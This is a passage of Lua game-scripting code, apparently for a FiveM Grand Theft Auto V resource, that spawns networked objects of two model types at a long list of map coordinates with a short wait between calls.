        CreateObject(2967811882, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
